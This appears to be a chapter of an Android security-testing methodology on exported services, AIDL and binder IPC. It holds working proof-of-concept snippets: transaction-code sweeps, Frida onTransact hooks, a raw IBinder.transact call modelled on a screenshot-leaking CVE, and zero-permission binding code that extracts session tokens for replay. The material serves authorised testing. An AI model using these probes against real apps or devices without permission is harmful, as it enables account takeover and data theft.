# D06 · Services, AIDL & Bound IPC

> Every method behind an exported `Service` is an unauthenticated RPC into the app's UID until the code
> proves otherwise, because neither AIDL nor `Messenger` authenticates anything. The export itself is
> worth nothing; the ceiling is **P1**, reached when a binder method vends a session token, writes a
> caller-chosen path the app later loads, or performs an account-level action for a zero-permission app.

| | |
|---|---|
| **Phases** | P3 attack-surface inventory, P4 static deep review, P5 IPC & component attack |
| **Milestones** | M3, M4, M5 |
| **VRT ceiling** | **P1**. `server_side_injection.remote_code_execution_rce` when an unguarded method writes into a directory the app `System.load()`s; `broken_authentication_and_session_management.authentication_bypass` or `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` when it vends a session token; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` when a method takes another user's id. The domain's own node, `broken_access_control.exposed_sensitive_android_intent`, is **null-rated — it is scored on what it exposes, never on the export.** |
| **Primary attacker model** | **AM-03** zero-permission local app. AM-04 for the user-enabled listener services (accessibility, notification listener, autofill). AM-05 when a bound method takes a user id. |
| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE; MASTG-TEST-0365, MASTG-TEST-0029 (deprecated), MASTG-TEST-0007, MASTG-TECH-0161, MASTG-TECH-0023, MASTG-TECH-0028, MASTG-TECH-0042, MASTG-TECH-0043, MASTG-KNOW-0020, MASTG-KNOW-0133, MASTG-BEST-0052, MASTG-TOOL-0001, MASTG-TOOL-0015; MASWE-0018, MASWE-0023, MASWE-0036, MASWE-0037, MASWE-0040, MASWE-0050; CWE-306, CWE-749, CWE-862, CWE-863, CWE-926, CWE-927, CWE-269, CWE-280, CWE-73, CWE-77; ATT&CK T1575, T1623, T1635, T1626, T1663, T1604, T1541, T1517, T1513, T1516, T1428, T1638; OWASP Mobile Top 10 2024 M3, M4, M8 |

## Why this domain pays

Services are the least-tested exported component class, and the reason is mechanical rather than
intellectual: an activity or a receiver can be driven with one `adb shell am` line, but a bound service
needs you to recover a method table out of a `$Stub` class and write a client. Most testers enumerate
services, see `Permission: null`, write "exported service" as a P5 inventory note and move on. That is
precisely where the money sits. Oversecured's banking and fintech research names AIDL interface abuse —
"service exposes AIDL interface performing auth operations without validating calling UID/package" — as
one of its account-takeover classes, and the TikTok `IndependentProcessDownloadService.tryDownload()`
case turned exactly this shape into arbitrary code execution in the victim's UID by writing
`libuserinfo.so` into `/data/user/0/com.zhiliaoapp.musically/app_lib/`.

The base rate is honest but not high. Most apps ship three to ten exported services, of which the
majority are framework-mandated (`AccountAuthenticator`, `SyncAdapter`, `MediaBrowserService`, Firebase
messaging, WorkManager's `SystemJobService`) and do nothing interesting. The hit rate concentrates in
two places: first-party services in a `:remote` process that were written for a companion or OEM app and
were never expected to have a hostile caller; and library-contributed services merged in from an AAR that
nobody on the team knows exist. Both are found by reading the **merged** manifest, not the one in
`base.apk`.

The one structural fact that makes this domain distinctive: **the check and the call happen on different
threads.** `Binder.getCallingUid()` is only meaningful on the binder transaction thread. The moment a
service hops to a `Handler`, an `Executor`, a coroutine dispatcher or a cached field, the identity is
gone and the call returns the app's *own* UID — which every comparison then passes. This is why
`Messenger`-based IPC is structurally unauthenticatable with the public SDK, and why a grep that finds
`getCallingUid` in the source tells you nothing until you read where it is evaluated. Android ships a
lint check for it (`BinderGetCallingInMainThread`) and almost no community Android checklist mentions it.

## The crux question

**For every method behind this app's exported binder: does it check *who* is calling — on the thread the
transaction actually arrives on — or does it only validate *what* is being asked?**

## Triage order

1. **Recover the method table for every exported bound service first.** Everything below depends on
   having the list; a service you cannot enumerate is a service you will silently skip.
2. **Grep for the absence of a caller check inside `$Stub` method bodies.** The single highest-yield
   grep in the domain; an interface with zero caller checks is an unauthenticated RPC and needs no
   further reasoning.
3. **Where a check exists, find out *where it runs*.** Off-transaction-thread evaluation, a discarded
   `int`, `checkCallingOrSelfPermission`, or a `clearCallingIdentity()` before the check all make the
   gate decorative — and these produce the strongest reports because the mechanism is unarguable.
4. **Methods that take a path, a filename or a URL.** They convert an access bug into an RCE or an
   exfiltration primitive. `savePath` into `app_lib` is the single highest-severity shape in the domain.
5. **Methods that return a token or a `ParcelFileDescriptor`.** These are the D13/D15 and D07 bridges.
6. **Started-service entry points (`onStartCommand`).** Cheap to test with `am startservice`, routinely
   forgotten because the reviewer went straight to the AIDL surface.
7. **Foreground-service types.** `camera`/`microphone`/`location` reachable from an exported entry point
   is a privacy Critical; the Android 14/15 restriction work is where apps grew ugly fallbacks. Attribute
   each declared type to its owning namespace while you are there — an SDK-owned one is its own finding.
8. **Privileged listener services.** Rarely reviewed, so the novelty rate is high — but the attacker
   model is AM-04 for most of them, so rate one step down and say so.
9. **Transport-level (oneway, transaction buffer, threadpool races, parcel mismatch).** Highest effort,
   lowest base rate, but the results are severe when they land.
10. **Discipline items last, applied to everything above.** They do not find bugs; they stop you filing
    four that are not there.

## Items

### D06-001 · Build the service register from the MERGED manifest, not from `base.apk`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — coverage method |
| **Attacker** | n/a |
| **Applies to** | All; mandatory for any app shipped as an AAB (split APKs are the norm) |
| **Maps to** | MASTG-TECH-0161 (Enumerating Services) |

- **Test:** Services contributed by AAR dependencies and by feature/config splits appear in the installed
  app's merged manifest but can be absent from whichever single APK you decompiled. A service register
  built from one file is wrong by construction, and the services you miss this way are exactly the
  library-contributed ones nobody has reviewed.
- **How:**
```bash
PKG=com.target.app; mkdir -p apk recon
for a in $(adb shell pm path "$PKG" | sed 's/package://'); do adb pull "$a" apk/; done
for f in apk/*.apk; do echo "== $f"; apkanalyzer manifest print "$f" | grep -cE '<service'; done
# authoritative runtime view — this is what the system actually resolves
adb shell dumpsys package "$PKG" | awk '/^Service Resolver Table:/{s=1} /^Provider Resolver Table:/{s=0} s' \
  > recon/service-resolver.txt
# structured register from the decoded manifest
apktool d -s -f apk/base.apk -o base_apktool >/dev/null
python3 - <<'PY' > recon/services.tsv
import xml.etree.ElementTree as ET
A='{http://schemas.android.com/apk/res/android}'
app=ET.parse('base_apktool/AndroidManifest.xml').getroot().find('application')
print("name\texported\tpermission\tfilters\tprocess\tfgs_type\tisolated\tstatus")
for e in app.findall('service'):
    ifs=len(e.findall('intent-filter')); exp=e.get(A+'exported')
    if exp is None: exp='implicit-true' if ifs else 'implicit-false'
    print("\t".join([e.get(A+'name'), exp, e.get(A+'permission') or '-', str(ifs),
        e.get(A+'process') or '-', e.get(A+'foregroundServiceType') or '-',
        e.get(A+'isolatedProcess') or '-', 'TODO']))
PY
wc -l recon/services.tsv; grep -c '<service' recon/service-resolver.txt
```
- **Proof:** A positive delta between the `dumpsys` resolver-table entry count and the summed per-APK
  count. Each extra name is a service you would otherwise never have tested. Every row must end the
  engagement with a `status` other than `TODO`.
- **Escalation:** The register is the input to every other item in this chapter, and feeds D01's
  attack-surface map and D03's permission review.
- **Ruled out when:** The resolver-table service names are a subset of the names in your decoded manifest
  **and** every row carries a terminal status. A register with `TODO` rows at delivery is a coverage
  defect, not a negative.

### D06-002 · Classify every exported service by reachability and by the protection level of its guard

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — inventory; `broken_access_control.exposed_sensitive_android_intent` (null) only once a reached action is demonstrated |
| **Attacker** | AM-03 |
| **Applies to** | All. **targetSdk < 31 (LEGACY):** a `<service>` with an `<intent-filter>` and no explicit `android:exported` is exported by default. From targetSdk 31 the attribute is mandatory, so `implicit-*` rows in your register mean you mis-parsed the manifest — re-check against `dumpsys`. |
| **Maps to** | MASTG-TEST-0365, MASTG-TECH-0161, MASTG-TOOL-0015 (drozer `app.service.info`), MASTG-KNOW-0133 |

- **Test:** For each service, record three independent facts: is it start-reachable, is it bind-reachable,
  and what is the **protection level** of the permission named in `android:permission`? A guard with
  `protectionLevel="normal"` or `"dangerous"` is not a guard against AM-03 — a zero-permission app simply
  requests it. Only `signature`/`signatureOrSystem` restricts to the app's own signing identity.
- **How:**
```bash
drozer> run app.service.info -a com.target.app -i -v
drozer> run app.service.info -p null
# resolve the protection level of each named permission (custom ones live in the app's own manifest)
grep -nA3 '<permission ' base_apktool/AndroidManifest.xml
adb shell dumpsys package com.target.app | grep -A3 'declared permissions:'
adb shell pm list permissions -d -g | grep -A2 com.target
# objection cross-check at runtime
objection -g com.target.app explore -c "android hooking list services"
```
- **Proof:** A table: service → exported → start/bind → permission → protection level. A row reading
  `exported=true, permission=null` or `permission=com.target.app.PERM, protectionLevel=normal` is the
  target list for D06-015 onward.
- **Escalation:** Every `normal`-level custom permission is also a D03 finding in its own right (a
  permission any app can hold is not an access control).
- **Ruled out when:** Every exported service is guarded by a `signature`-level permission **and** you have
  confirmed no other installed package is signed by the same key (`adb shell dumpsys package <pkg> | grep
  -A2 signatures` across the vendor's app family) — a same-signature sibling reintroduces the reach.

### D06-003 · `android:permission` on `<service>` is checked at bind/start time only, never per transaction

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when a method takes another user's id; `broken_access_control.privilege_escalation` (null) otherwise |
| **Attacker** | AM-04 (holds the bind permission) or AM-05 (second account) |
| **Applies to** | All bound services with a manifest permission |
| **Maps to** | MASTG-TEST-0365, MASTG-KNOW-0133, MASWE-0018 (CWE-862, CWE-863) |

- **Test:** The manifest permission is enforced by the system at `Context.startService()`,
  `stopService()` and `bindService()`. Once a caller legitimately binds — because it holds the permission,
  or because the permission is weak — **every method on the interface is reachable**. If the app treats
  "they got a binder" as authorisation, per-user and per-tenant checks are simply missing. This is IDOR
  over IPC.
- **How:** Bind legitimately as low-privilege user A, then call each method with identifiers belonging to
  user B.
```java
IMyAidl svc = IMyAidl.Stub.asInterface(binder);
Log.i("POC", String.valueOf(svc.getProfile(B_ACCOUNT_ID)));   // A is bound; B's id is supplied
Log.i("POC", String.valueOf(svc.getOrders(B_ACCOUNT_ID)));
```
- **Proof:** Two tester-owned accounts. Bound as A, `getProfile(B_id)` returns B's record — capture the
  returned object in your PoC's logcat with both ids visible.
- **Escalation:** → D15, where the same identifier is almost always accepted by the backend endpoint the
  service wraps; that is the higher-severity report.
- **Ruled out when:** Every method that accepts an identifier resolves it against the *caller's* session
  (not the supplied id) inside the method body, or the interface exposes no id-parameterised method at
  all — demonstrate by supplying B's id and receiving A's data or an authorisation error.

### D06-004 · `android:process=":remote"` — instrument the right PID or you will report a false negative

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — method |
| **Attacker** | n/a |
| **Applies to** | All; services in a separate process are the usual pattern for a remote interface |
| **Maps to** | MASTG-KNOW-0133 (`android:process`, "common for services that expose a remote interface to other apps"), MASTG-TECH-0043, MASTG-TOOL-0001 |

- **Test:** A service in a separate process serves its binder transactions from that PID. Hooks attached
  to the main process never fire, and the tester concludes "no caller check is reached" when in fact no
  code was instrumented at all. Separate-process services are also, empirically, the ones most worth
  reversing.
- **How:**
```bash
grep -n 'android:process' base_apktool/AndroidManifest.xml
adb shell ps -A | grep com.target.app        # expect com.target.app and com.target.app:remote
frida -U -n "com.target.app:remote" -l hook.js
# confirm which PID actually holds the service
adb shell dumpsys activity services com.target.app | grep -E 'ProcessRecord|app=|pid='
```
- **Proof:** Two PIDs for the package, and a Frida hook that fires only when attached to the `:remote`
  one. Record the PID you attached to in every runtime artefact.
- **Escalation:** Correct-process instrumentation is the precondition for D06-010, D06-011 and every
  D26 runtime item.
- **Ruled out when:** `ps -A` shows exactly one process for the package and `dumpsys activity services`
  names that PID for every service record.

### D06-005 · Do not claim Instant-App or browser reach for a service without `android:visibleToInstantApps`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — precondition control |
| **Attacker** | Governs whether AM-02 can be claimed at all |
| **Applies to** | All |
| **Maps to** | H1 #258460 (Quora) — the researcher's own published correction |

- **Test:** A service is reachable by an Instant App **only** when `android:visibleToInstantApps="true"`.
  Claiming a one-click (AM-02) precondition without that attribute overstates the attacker model and gets
  the report downgraded — the researcher on #258460 made exactly this claim and had to correct it.
- **How:**
```bash
grep -n 'visibleToInstantApps' base_apktool/AndroidManifest.xml
adb shell dumpsys package com.target.app | grep -i 'instant'
```
- **Proof:** The attribute present (claim stands) or absent (rate as AM-03: requires an installed app).
  State which in the report's precondition sentence.
- **Escalation:** None — this prunes an over-claim before it reaches triage.
- **Ruled out when:** The attribute is absent on every exported service, so the finding is AM-03 and is
  written that way.

### D06-006 · Enumerate the service classes that *cannot* be un-exported, and test what they added

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what is exposed) |
| **Attacker** | AM-03 |
| **Applies to** | All; any targetSdk — the intent filter *is* the export, so the targetSdk 31 explicit-export rule does not close these |
| **Maps to** | H1 #146179 (ownCloud — `AccountAuthenticatorService` and `FileSyncService` both `exported="true"`), MASTG-TEST-0365, MASWE-0018 |

- **Test:** Several service types are bound by the framework and therefore must be exported:
  `AccountAuthenticator`, `SyncAdapter`, `MediaBrowserService`, `JobService`, the privileged listeners,
  `CarAppService`, `WearableListenerService`, Firebase messaging services. The developer's only control is
  `android:permission` plus an in-code caller check. Test what the app *added* to the framework contract —
  the extra methods, the extra actions, the extra `Bundle` keys — because that is what was never designed
  for a hostile caller.
- **How:**
```bash
grep -nB3 -A12 -E 'android\.accounts\.AccountAuthenticator|android\.content\.SyncAdapter|android\.media\.browse\.MediaBrowserService|com\.google\.firebase\.MESSAGING_EVENT|androidx\.car\.app\.CarAppService|com\.google\.android\.gms\.wearable' base_apktool/AndroidManifest.xml
adb shell dumpsys account | grep -A8 com.target
# what does the authenticator actually vend?
grep -rnE 'extends AbstractAccountAuthenticator|getAuthToken\(|addAccount\(|KEY_AUTHTOKEN' out/sources/
```
- **Proof:** An authenticator that returns an auth token to a caller that is not the account owner, or a
  sync service that accepts attacker-controlled sync parameters — captured in your PoC's log.
- **Escalation:** A returned auth token → D13 account takeover, D15 backend abuse.
- **Ruled out when:** Each such service implements only the framework contract, and the contract methods
  are gated by the framework's own caller check (`AbstractAccountAuthenticator` enforces
  `AUTHENTICATE_ACCOUNTS`/signature matching for the token path) — confirm by calling from a PoC app and
  receiving a `SecurityException` rather than a token.

### D06-007 · Recover the complete AIDL method table before touching the device

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — method |
| **Attacker** | n/a |
| **Applies to** | All apps exposing bound services |
| **Maps to** | MASTG-TECH-0161 ("you first need to identify the inputs it expects … the methods of an AIDL interface"), MASTG-TECH-0023, MASTG-KNOW-0020 (Binder) |

- **Test:** drozer cannot craft a parcel for an AIDL interface. You must recover the method table from the
  generated `$Stub` — the `TRANSACTION_*` constants give you code→name, and `$Stub$Proxy` gives you the
  exact argument order and types for the wire format.
- **How:**
```bash
jadx -d out apk/base.apk
grep -rln 'extends android.os.Binder implements' out/sources | tee recon/stubs.txt
# code -> name
grep -rhnE 'static final int TRANSACTION_[A-Za-z0-9_]+ = \(android\.os\.IBinder\.FIRST_CALL_TRANSACTION \+ [0-9]+\)' out/sources \
  | sed -E 's/.*TRANSACTION_([A-Za-z0-9_]+).*\+ ([0-9]+)\).*/code=\2 name=\1/' | sort -t= -k2 -n
# argument order and types, per method
for f in $(cat recon/stubs.txt); do echo "== $f"; sed -n '/\$Stub\$Proxy/,$p' "$f" | grep -nE 'public .*\(|_data\.write|_reply\.read'; done
# smali fallback when jadx fails on the class
grep -rn 'Landroid/os/IInterface;\|asInterface\|TRANSACTION_' out/smali/ | grep -i target | head -40
```
- **Proof:** A written method table: transaction code → method name → argument types → return type. This
  artefact is what every subsequent item consumes, and it belongs in the report appendix as coverage
  evidence.
- **Escalation:** Feeds D06-008, D06-011, D06-015.
- **Ruled out when:** The `$Stub` classes recovered account for every `onBind` in the register and each
  `onBind` either returns `null` or a binder whose interface you have fully enumerated.

### D06-008 · Build the per-method check matrix — interfaces check one method and forget the rest

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when a method returns a token that authenticates an internet-facing API; `broken_access_control.privilege_escalation` (null) otherwise |
| **Attacker** | AM-03 |
| **Applies to** | All; highest yield on OEM system services and on companion-app interfaces |
| **Maps to** | MASTG-TEST-0365 ("Determine whether the service verifies the caller's permission at runtime … before processing sensitive requests"), MASTG-BEST-0052, MASWE-0018 |

- **Test:** Per-method asymmetry is the norm, not the exception. Interfaces check the caller in one or two
  methods and forget the others — the classic shape is a vendor-added method sitting beside a checked
  AOSP-derived method with no checks at all. Test each transaction independently; **do not stop after the
  first `SecurityException`.**
- **How:**
```bash
awk '/public .*throws android\.os\.RemoteException/{m=$0}
     /checkCalling|enforceCalling|getCallingUid|getCallingPid|getPackagesForUid|checkSignatures/{
       print FILENAME": "m" -> "$0}' $(grep -rl 'extends .*\.Stub' out/sources)
# the inverse — methods with NO check anywhere in the body
python3 - <<'PY'
import re,glob,io
CHK=re.compile(r'checkCalling|enforceCalling|getCallingUid|getCallingPid|getPackagesForUid|checkSignatures|hasSigningCertificate')
for f in glob.glob('out/sources/**/*.java',recursive=True):
    s=io.open(f,encoding='utf-8',errors='ignore').read()
    if '.Stub' not in s: continue
    for m in re.finditer(r'public\s+[\w\[\]<>., ]+\s+(\w+)\s*\([^)]*\)\s*(throws [\w., ]+)?\{',s):
        body=s[m.end():m.end()+4000]
        if not CHK.search(body): print(f"NOCHECK {f}:{m.group(1)}")
PY
```
- **Proof:** A table in the report: method name → check present/absent → attacker result. One row reading
  "no check, returns user record" is the finding. Count your rows against the method table from D06-007;
  a short table means the loop ate something.
- **Escalation:** → D15 for whatever the method's backend call does; → D06-032 if any unchecked method
  takes a path.
- **Ruled out when:** Every method in the table carries a check that dominates the sensitive action, and
  the check is evaluated on the transaction thread (see D06-016). A check present in *some* methods is
  not a negative for the others.

### D06-009 · Trace the Dagger/Hilt generated wrapper to the real delegate before concluding anything

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — method; prevents a confident false negative |
| **Attacker** | n/a |
| **Applies to** | Dagger/Hilt/tiktok-DI codebases — i.e. most large modern apps, and all Google first-party apps |
| **Maps to** | MASTG-TECH-0023 (Reviewing Decompiled Java Code) |

- **Test:** An exported `Foo_Service extends <obfuscated>` whose constructor is `super(SomeInterface.class)`
  is a **generated wrapper**. The real `onBind`/handler body is a DI-provided delegate. Reading the wrapper
  tells you nothing and produces a confidently wrong "this service does nothing" negative.
- **How:** Resolve the interface method to its implementation and read *that* body. Grep the generated
  component/module classes for the binding:
```bash
grep -rn 'class .*_Service\b|extends Hilt_\|GeneratedComponent\|DaggerApplication' out/sources | head -30
# find the provider that supplies the delegate
grep -rn 'Provider<.*Handler>\|@Provides\|get()\s*{\s*return new ' out/sources | grep -i <interface-name>
```
  Runtime shortcut when the DI graph is unreadable: hook the wrapper's `onBind`/handler and print
  `this.<field>.getClass().getName()` for each injected field.
- **Proof:** You can quote the delegate's handler body by `file:line`, not the wrapper's `super()` call.
- **Escalation:** The resolved delegate is the real D06 sink and frequently the real D08 redirection shape.
- **Ruled out when:** The service class contains its own handler body with no injected delegate, or every
  injected field resolves to a framework class with no app logic.

### D06-010 · Hook `onTransact` at runtime to recover codes, arguments and the real calling UID

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null) — rated on the transaction reached |
| **Attacker** | AM-03 |
| **Applies to** | Apps exposing AIDL services; requires a Frida-capable harness (D26) |
| **Maps to** | MASTG-TECH-0042 (Getting Loaded Classes and Methods Dynamically), MASTG-TECH-0043 (Method Hooking), MASTG-TOOL-0001 |

- **Test:** Static recovery misses obfuscated and dynamically registered stubs. Hook the binder entry point
  in the *serving* process and drive transactions from an unprivileged context to see which codes are
  accepted and what UID the service believes is calling.
- **How:**
```js
// frida -U -n "com.target.app:remote" -l ontransact.js
Java.perform(function () {
  Java.enumerateLoadedClasses({
    onMatch: function (name) {
      if (/\$Stub$/.test(name) && name.indexOf('com.target') === 0) console.log('[Stub] ' + name);
    },
    onComplete: function () {}
  });
  var Binder = Java.use('android.os.Binder');
  var Thread = Java.use('java.lang.Thread');
  Binder.onTransact.implementation = function (code, data, reply, flags) {
    console.log('[onTransact] ' + this.$className + ' code=' + code +
                ' callingUid=' + Binder.getCallingUid() +
                ' callingPid=' + Binder.getCallingPid() +
                ' oneway=' + ((flags & 1) ? 'yes' : 'no') +
                ' thread=' + Thread.currentThread().getName() +
                ' dataSize=' + data.dataSize());
    return this.onTransact(code, data, reply, flags);
  };
});
```
- **Proof:** An `onTransact` line showing `callingUid` equal to your PoC app's UID
  (`adb shell dumpsys package com.poc.attacker | grep userId=`), followed by the handler completing with
  no permission check in the decompiled body for that code.
- **Escalation:** Unauthenticated binder RPC → whatever the handler does. Pair with D06-016 to prove the
  check is a no-op rather than absent.
- **Ruled out when:** Every accepted code is preceded by a `SecurityException` for your UID, visible as the
  hook firing and the handler returning before the sensitive call.

### D06-011 · Sweep the raw transaction space with the NPE-versus-`SecurityException` oracle

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All Android versions with `service call`; essential when the interface is obfuscated and the method table is unrecoverable |
| **Maps to** | CVE-2026-0047 ("Phase 1: Confirming the Bug"), CWE-280 |

- **Test:** Call each transaction code with no or garbage arguments and read *which* exception comes back.
  A `NullPointerException` raised **inside** the service method proves the method body executed — i.e. no
  permission check ran first. A `SecurityException` proves the gate exists and fires before the body.
  This distinguishes hardened from exploitable across an entire transaction table in minutes.
- **How:** Never iterate this in a shell array loop — zsh array expansion fails silently and you will
  report a clean sweep that never ran. Use Python and **count your results against the input count.**
```bash
adb shell service list | grep -i <name>
adb shell service call activity 117           # single probe, read the Parcel
```
```python
#!/usr/bin/env python3
import subprocess, re, sys
svc, lo, hi = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
rows = 0
for code in range(lo, hi + 1):
    try:
        out = subprocess.run(["adb","shell","service","call",svc,str(code)],
                             capture_output=True, text=True, timeout=15).stdout
    except Exception as e:
        print(f"code={code} ERROR {e}"); rows += 1; continue
    if "SecurityException" in out:   verdict = "GATED"
    elif "NullPointerException" in out or "IllegalArgumentException" in out: verdict = "BODY-EXECUTED"
    elif re.search(r"Result: Parcel\(00000000", out): verdict = "OK-EMPTY"
    else: verdict = "OTHER"
    print(f"code={code} {verdict} :: {out.strip()[:160]}")
    rows += 1
print(f"# probed={hi-lo+1} rows={rows}", file=sys.stderr)
assert rows == hi - lo + 1, "loop ate results"
```
- **Proof:** The Parcel contents naming the method and the exception class, e.g.
  `Result: Parcel(fffffffc ...NullPointerException... at ActivityManagerService.dumpBitmapsProto(...) at
  IActivityManager$Stub.onTransact(...))` — an NPE, not a `SecurityException`, means no permission check.
  The stack trace inside the Parcel is the load-bearing detail; capture it verbatim.
- **Escalation:** Once the oracle says "no check", build the real parcel (D06-012) and reach the data.
- **Ruled out when:** Every probed code returns `SecurityException`, or returns a `Parcel` whose exception
  originates in `Stub.onTransact` argument unmarshalling rather than in the service method — read
  D06-075 (the layer-ordering trap) before you call that a bypass.

### D06-012 · Raw `IBinder.transact()` bypasses hidden-API restrictions entirely

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null); `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) or higher on what is returned |
| **Attacker** | AM-03 |
| **Applies to** | Android 9+ (hidden-API blocklist era). The bypass property holds because the blocklist is an ART-level check that does not exist at the binder layer. |
| **Maps to** | CVE-2026-0047, CWE-280; MHL "CVE-2026-0047: Stealing Screenshots from Every App with Zero Permissions", PoC `github.com/mobilehackinglab/CVE-2026-0047-poc`; ATT&CK T1575 |

- **Test:** Where a system-service (or app-service) method is not reachable from the SDK, call it by
  transaction code over a raw `Parcel`. No reflection, no `hidden_api_policy` change, no root.
- **How:**
```java
IBinder amBinder = (IBinder) Class.forName("android.os.ServiceManager")
        .getMethod("getService", String.class).invoke(null, "activity");
String descriptor = amBinder.getInterfaceDescriptor();
Parcel data = Parcel.obtain(), reply = Parcel.obtain();
try {
    data.writeInterfaceToken(descriptor);
    // …arguments in exact AIDL wire order; write a ParcelFileDescriptor with writeFileDescriptor()…
    amBinder.transact(117, data, reply, 0);
    reply.readException();
} finally { data.recycle(); reply.recycle(); }
```
- **Proof:** The CVE-2026-0047 PoC returns 679,091 bytes of protobuf containing 63 PNGs to a
  zero-permission app. For your target, the returned bytes plus the PoC app's manifest showing an empty
  `<uses-permission>` list.
- **Escalation:** → D25 privileged surfaces; → D20 credential harvesting from captured UI.
- **Ruled out when:** `ServiceManager.getService()` returns null for your UID, or the transaction returns
  a `SecurityException` for every argument shape you can construct from the descriptor.

### D06-013 · Audit the `dump*` / `*Proto` method family for a missing `DUMP` enforcement

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the dumped data is rendered UI containing credentials or OTP screens |
| **Attacker** | AM-03 |
| **Applies to** | AOSP/system-app and OEM assessments; also any app service that exposes a diagnostic method over binder |
| **Maps to** | CVE-2026-0047, CWE-280 ("Improper Handling of Insufficient Permissions or Privileges") |

- **Test:** Services expose dozens of diagnostic methods over binder, and each is a separate place the
  `DUMP` signature permission can be forgotten. The vulnerable/fixed pair for CVE-2026-0047 differs by
  exactly one call.
- **How:**
```bash
# in the decompiled framework, or in the app's own service classes
grep -rnE 'public .*dump.*Proto|public byte\[\] dump|public void dump\(' out/sources/ frameworks/base/services/ 2>/dev/null
# each hit must be preceded by:
grep -rn 'enforceCallingOrSelfPermission(android.Manifest.permission.DUMP' out/sources/ frameworks/base/services/ 2>/dev/null
```
  The patched shape is:
```java
enforceCallingOrSelfPermission(android.Manifest.permission.DUMP,
    "ActivityManagerService: dumpBitmapsProto");
```
- **Proof:** A `dump*` method whose body starts without an `enforceCallingOrSelfPermission(DUMP, …)`, plus
  the NPE oracle (D06-011) confirming the body executes for your UID, plus the returned bytes.
- **Escalation:** → D20 → D13 (credential harvesting from a captured banking or password-manager frame).
- **Ruled out when:** Every `dump*`/`*Proto` method's first statement is the `DUMP` enforcement, confirmed
  by reading the body rather than by grepping the file for the string anywhere.

### D06-014 · Start the pipe reader thread *before* the transaction on any FD-returning API

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — prevents a false negative on a Critical |
| **Attacker** | n/a |
| **Applies to** | All `dumpsys`-shaped binder APIs and any AIDL method taking a `ParcelFileDescriptor` |
| **Maps to** | CVE-2026-0047 PoC, "The critical implementation detail is pipe management" |

- **Test:** Any dump-style API that writes to a `ParcelFileDescriptor` writes **synchronously**. If the
  64 KB pipe buffer fills before someone drains it, both sides deadlock and your PoC hangs — which testers
  routinely misread as "not vulnerable". This item exists solely to stop that misreading.
- **How:**
```java
ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
ByteArrayOutputStream sink = new ByteArrayOutputStream();
Thread reader = new Thread(() -> {
    try (InputStream in = new ParcelFileDescriptor.AutoCloseInputStream(pipe[0])) {
        byte[] b = new byte[8192]; int n;
        while ((n = in.read(b)) > 0) sink.write(b, 0, n);
    } catch (Exception ignored) {}
});
reader.start();                                  // MUST be before transact()
Thread invoker = new Thread(() -> { /* transact(), then pipe[1].close() in finally */ });
invoker.start(); invoker.join(15000); reader.join(3000);
Log.i("POC", "bytes=" + sink.size());
```
- **Proof:** A non-zero byte count instead of an indefinite block. The reference run returns 679,091 bytes.
- **Escalation:** Enables the D06-012 and D06-013 findings at all.
- **Ruled out when:** The reader thread is started first, the writer FD is closed in a `finally`, and the
  call still returns zero bytes — that is a genuine negative.

### D06-015 · No caller check anywhere in the `$Stub` body — the base bug of the domain

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when a method returns a token; `broken_authentication_and_session_management.authentication_bypass` (P1) when it mints or validates auth material; `broken_access_control.exposed_sensitive_android_intent` (null) for the primitive itself |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | MASTG-TEST-0365, MASWE-0018 (CWE-306, CWE-749, CWE-862), MASVS-PLATFORM-1, Mobile Top 10 2024 M3; Oversecured "Vulnerabilities that lead to account takeover in banking and fintech mobile apps", item 7 (AIDL Interface Abuse); H1 #384257 (Zomato, Low, $300 — "leakage of access token of the user that leads to account takeover") |

- **Test:** AIDL adds no authentication of its own. A service that reads its arguments but never calls
  `Binder.getCallingUid()`, `getCallingPid()`, `checkCallingPermission()` or `enforceCallingPermission()`
  is unauthenticated regardless of what the manifest says. This is the single highest-yield grep in the
  domain.
- **How:**
```bash
grep -rn 'onBind\|Stub()' out/sources/ | head -50
grep -rnE 'Binder\.getCallingUid|Binder\.getCallingPid|getCallingUidOrThrow|checkCallingPermission|checkCallingOrSelfPermission|enforceCallingPermission|enforceCallingOrSelfPermission|getPackagesForUid|checkSignatures|hasSigningCertificate' out/sources/
# native services in the same app:
grep -rn 'IPCThreadState::getCallingPid\|IPCThreadState::getCallingUid\|PermissionCache::checkPermission' <native-src>
```
  Then bind from a PoC app that declares **no** permissions and is signed with a throwaway key:
```java
Intent i = new Intent();
i.setComponent(new ComponentName("com.target.app", "com.target.app.ExportedService"));
bindService(i, conn, Context.BIND_AUTO_CREATE);
// in onServiceConnected:
IMyAidl svc = IMyAidl.Stub.asInterface(binder);
Log.i("POC", "getToken -> " + svc.getToken());
```
- **Proof:** The method returning a token, a user record or a file descriptor to your PoC app, with
  `adb shell dumpsys package com.poc.attacker` showing an empty requested-permission list and no
  `SecurityException` in logcat. Then replay the token against the production API — that response is the
  finding, not the binder call.
